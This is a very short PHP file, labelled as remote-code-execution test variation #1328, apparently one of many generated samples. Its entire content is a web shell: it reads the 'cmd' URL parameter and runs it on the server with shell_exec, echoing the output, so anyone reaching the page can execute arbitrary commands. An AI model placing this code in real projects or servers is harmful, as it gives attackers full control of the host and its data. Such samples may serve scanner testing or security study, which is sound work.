<?php
// RCE test variation #1328
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>